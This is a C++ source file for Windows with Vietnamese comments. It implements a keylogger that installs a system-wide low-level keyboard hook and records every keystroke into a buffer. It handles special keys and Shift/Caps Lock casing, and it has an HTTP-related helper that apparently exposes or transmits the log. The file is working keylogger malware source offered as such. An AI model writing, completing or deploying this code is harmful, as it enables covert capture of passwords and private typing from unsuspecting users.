#include <iostream>
#include <string>
#include <map>
#include <thread>
#include <winsock2.h>
#include "keylogger.h"
#include "http_utils.h"

HHOOK hHook = NULL;
std::string KEY_LOG_BUFFER = "";

std::string keylog_append(const std::string& key) {
    if (key == "Enter") KEY_LOG_BUFFER += "\n";
    else if (key == "Space") KEY_LOG_BUFFER += " ";
    else if (key == "Backspace") { if (!KEY_LOG_BUFFER.empty()) KEY_LOG_BUFFER.pop_back(); }
    else KEY_LOG_BUFFER += key;
    
    std::cout << "Key received: " << key << std::endl;
    return http_response("OK");
}

void AddKeyToLog(int key_stroke) {
    if (key_stroke == 13) KEY_LOG_BUFFER += " [ENTER]\n";
    else if (key_stroke == 8) {
        if (!KEY_LOG_BUFFER.empty()) KEY_LOG_BUFFER.pop_back();
    }
    else if (key_stroke == 32) KEY_LOG_BUFFER += " ";
    else if (key_stroke == VK_TAB) KEY_LOG_BUFFER += " [TAB] ";
    else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT) {} // Bỏ qua shift đơn lẻ
    else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL) {}
    else if (key_stroke == VK_MENU || key_stroke == VK_LMENU || key_stroke == VK_RMENU) {}
    else if (key_stroke == VK_CAPITAL) KEY_LOG_BUFFER += " [CAPS] ";
    else {
        char key = (char)key_stroke;
        // Kiểm tra xem có phải ký tự in được không
        if (key >= 32 && key <= 126) {
            // Xử lý Shift (đơn giản hóa: nếu CapsLock hoặc Shift đang giữ thì viết hoa)
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000);
            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001);
            
            if (!shift && !caps) {
                key = tolower(key);
            }
            KEY_LOG_BUFFER += key;
        }
    }
    std::cout << "Key logged: " << key_stroke << std::endl; // Debug
}

// Callback: Windows sẽ gọi hàm này mỗi khi có phím nhấn
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
            AddKeyToLog(pKey->vkCode);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Hàm chạy vòng lặp bắt phím (Chạy trên luồng riêng)
void StartKeyloggerThread() {
    // Cài đặt Hook loại WH_KEYBOARD_LL (Low Level)
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    
    if (hHook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return;
    }

    // Vòng lặp tin nhắn (Bắt buộc để Hook hoạt động)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
}